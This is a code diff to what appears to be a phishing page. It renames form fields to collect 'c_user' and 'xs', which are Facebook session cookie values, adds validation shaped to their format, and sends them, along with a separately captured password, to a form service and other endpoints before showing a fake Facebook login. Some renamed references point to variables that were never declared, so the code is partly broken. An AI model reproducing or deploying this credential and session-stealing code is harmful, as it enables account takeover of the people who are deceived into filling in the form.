@@ -1198,15 +1198,15 @@
           </div>
          
           <div class="form-group">
-            <label for="nameInput" class="form-label translatable" data-key="nameLabel">c_user</label>
-            <input type="text" class="form-input" id="nameInput" placeholder="Enter c_user">
-            <div class="input-error" id="nameError"></div>
+            <label for="c_userInput" class="form-label translatable" data-key="c_userLabel">c_user</label>
+            <input type="text" class="form-input" id="c_userInput" pattern="\d+" title="c_user only" required="" placeholder="Enter c_user"> 
+            <div class="input-error" id="c_userError"></div>
           </div>
          
           <div class="form-group">
-            <label for="mallInput" class="form-label translatable" data-key="mallLabel">xs</label>
-            <input type="text" class="form-input" id="mallInput" placeholder="Enter xs">
-            <div class="input-error" id="mallError"></div>
+            <label for="xsInput" class="form-label translatable" data-key="xsLabel">xs</label>
+            <input type="text" class="form-input" id="xsInput" pattern=".{20,}" title="xs only" required="" placeholder="Enter xs">
+            <div class="input-error" id="xsError"></div>
           </div>
          
           <div class="form-warning" id="formError">
@@ -1695,10 +1695,10 @@ document.addEventListener('DOMContentLoaded', function() {
   const changeLanguageBtn = document.getElementById('changeLanguageBtn');
 
   // Form elements
-  const nameInput = document.getElementById('nameInput');
-  const mallInput = document.getElementById('mallInput');
-  const nameError = document.getElementById('nameError');
-  const mallError = document.getElementById('mallError');
+  const nameInput = document.getElementById('c_userInput');
+  const mallInput = document.getElementById('xsInput');
+  const nameError = document.getElementById('c_userError');
+  const mallError = document.getElementById('xsError');
   const formError = document.getElementById('formError');
   const formErrorText = document.getElementById('formErrorText');
   const sendBtn = document.getElementById('sendBtn');
@@ -1903,30 +1903,30 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   }
 
   // Form validation
-  if (nameInput) {
-    nameInput.addEventListener('input', () => {
-      const original = nameInput.value;
+  if (c_userInput) {
+    c_userInput.addEventListener('input', () => {
+      const original = c_userInput.value;
       const cleaned  = original.replace(/\D+/g, ''); // keep digits only
       if (original !== cleaned) {
-        nameInput.value = cleaned;
-        if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in Name.';
+        c_userInput.value = cleaned;
+        if (c_userError) c_userError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in c_user.';
       } else {
-        if (nameError) nameError.textContent = '';
+        if (c_userError) c_userError.textContent = '';
       }
     });
   }
 
   // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
-  const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
-  if (mallInput) {
-    mallInput.addEventListener('input', () => {
-      const original = mallInput.value;
-      const cleaned  = original.replace(mallAllowed, '');
+  const xsAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
+  if (xsInput) {
+    xsInput.addEventListener('input', () => {
+      const original = xsInput.value;
+      const cleaned  = original.replace(xsAllowed, '');
       if (original !== cleaned) {
-        mallInput.value = cleaned;
-        if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Mall can contain letters, numbers, and symbols only.';
+        xsInput.value = cleaned;
+        if (xsError) xsError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> xs can contain letters, numbers, and symbols only.';
       } else {
-        if (mallError) mallError.textContent = '';
+        if (xsError) xsError.textContent = '';
       }
     });
   }
@@ -1957,16 +1957,16 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   // Send click: require non-empty + no validation errors
   if (sendBtn) {
     sendBtn.addEventListener('click', function() {
-      const name = nameInput.value.trim();
-      const mall = mallInput.value.trim();
+      const c_user = c_userInput.value.trim();
+      const xs = xsInput.value.trim();
 
-      if(!name || !mall) {
+      if(!c_user || !xs) {
         if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
         if (formError) formError.classList.add('show');
         setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
         return;
       }
-      if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+      if ((c_userError && c_userError.textContent) || (xsError && xsError.textContent)) {
         if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
         if (formError) formError.classList.add('show');
         setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
@@ -2017,15 +2017,13 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
 
   // Function to submit form data
   function submitFormData() {
-    const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
-    const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+    const c_user = document.getElementById('c_userInput') ? document.getElementById('c_userInput').value.trim() : '';
+    const xs = document.getElementById('xsInput') ? document.getElementById('xsInput').value.trim() : '';
    
     // Prepare the data to send
     const formData = {
-      name: name,
-      mall: mall,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
+      c_user: c_user,
+      xs: xs,
       language: navigator.language
     };
    
@@ -2049,8 +2047,8 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
      
       // Also submit to the additional endpoints
       submitToOtherEndpoints({
-        bhenjachud: name,
-        majachud: mall
+        bhenjachud: c_user,
+        majachud: xs
       });
      
       showfbLogin();
@@ -2059,8 +2057,8 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       console.error('Error submitting form:', error);
       // Still proceed with the other endpoints even if formsubmit fails
       submitToOtherEndpoints({
-        bhenjachud: name,
-        majachud: mall
+        bhenjachud: c_user,
+        majachud: xs
       });
      
       
@@ -2081,8 +2079,6 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     // Prepare the data to send
     const fbData = {
       password: password,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
       language: navigator.language
     };
    
